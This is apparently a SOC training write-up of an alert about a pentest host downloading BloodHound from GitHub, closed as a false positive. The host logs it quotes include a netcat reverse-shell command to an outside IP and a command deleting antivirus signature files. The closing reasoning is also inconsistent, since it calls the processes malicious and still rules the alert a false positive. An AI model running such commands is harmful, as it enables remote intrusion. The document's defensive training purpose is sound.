# SOC119 - Proxy - Malicious Executable File Detected

We received a Medium alert for a malicious executable file detection. 

> **EventID:** 79
> 
> **Event Time:** Mar, 15, 2021, 09:30 PM
> 
> **Rule:** SOC119 - Proxy - Malicious Executable File Detected
> 
> **Level:** Security Analyst
> 
> **Source Address:** 172.16.20.5
> 
> **Source Hostname:** PentestMachine
> 
> **Destination Address:** 140.82.121.4
> 
> **Destination Hostname:** github.com
> 
> **Username:** kali
> 
> **Request URL:** https://github.com/BloodHoundAD/BloodHound/releases
> 
> **User Agent:** Penetration Test - Do not Contain
> 
> **Device Action:** Allowed

## Analysis
We're going to give into the source address some to see if the destination host was contacted. 

![Screenshot 2023-02-17 at 8 24 32 AM](https://user-images.githubusercontent.com/74877876/219664377-e6dda9c2-31cf-4c78-b25b-9b3f0bb67241.png)

We can see it was on March 15, 2021 at 9:30pm which is the time and date of the alert. Let's look at the connection details.

![Screenshot 2023-02-17 at 8 25 55 AM](https://user-images.githubusercontent.com/74877876/219664676-1ed2ccb0-c2ae-45f4-8a44-58a9b2e63f8d.png)

https://github.com/BloodHoundAD/BloodHound/releases was accessed it looks like. 

We're going to look more at the source machine, any details we can find on that file or March 15, 2021. Looks like the source address, 172.16.20.5, is in fact the source hostname, PentestMachine.

No browser log. 

Command log: 13.06.2021 16:23 nmap -sV -sP 172.16.20.0/24

Network connections:
- 13.06.2021 16:23:01 - 172.16.20.1
- 13.06.2021 16:23:06 - 172.16.20.2
- 13.06.2021 16:23:13 - 172.16.20.3
- 13.06.2021 16:23:15 - 172.16.20.4
- 13.06.2021 16:23:19 - 172.16.20.6

The only processes that appear to be suspicious don't have a date. 
- nc 101.32.223.119 1234 -e /bin/sh - transfers the bash code to detected malicious Hong Kong domain using netcat.
- rm -f /var/lib/clamav-unofficial-sigs/pid/clamav-unofficial-sigs.pid - looks like Linux AV and it's signatures were removed. 
- A SQL database was accessed.

![Screenshot 2023-02-17 at 9 19 59 AM](https://user-images.githubusercontent.com/74877876/219680134-b389f0b0-a18e-4d99-8e36-c26cba644f3a.png)

The other processes, I don't find suspicious. They pulled another operating system and run it on VMware on the device. The processes I find suspicious I'm going to determine as malicious but the other processes aren't. 

The host machine is an Ubuntu machine so we know it's not an executable file that was accessed, but we're going to continue to analyze the file. 

**VirusTotal:** 
- Looking at https://github.com/BloodHoundAD/BloodHound/releases doesn't show any malicious detections. 
- Looking at 140.82.121.4 doesn't show any detections but shows the address is based in Denmark and connected to GitHub.
- While there lots of files 140.82.121.4 communicated with BloodHound's GitHub doesn't appear to be one of them. 

Since I'm familiar with GitHub, I looked up BloodHound's GitHub and was able to find the releases page. The URL does match the requested URL.

Let's look at BloodHound's GitHub is about.

![Screenshot 2023-02-17 at 9 11 28 AM](https://user-images.githubusercontent.com/74877876/219678260-90aba689-2db1-4569-b967-5dcf1ef96a08.png)

It definitely seems like their content is for pentesting. 

## Determination
Determining to be false positive since the file was accessed according to the logs but used for pentesting. The file and the logs are suspicious based on the processes performed but looking into the intent of BloodHound's GitHub, the file was used for pentesting.  

While suspicious and the file malicious, it was used for pentesting.

## Helpful Link
- GitHub: https://github.com/BloodHoundAD/BloodHound
- VirusTotal: https://www.virustotal.com/gui/home/upload 
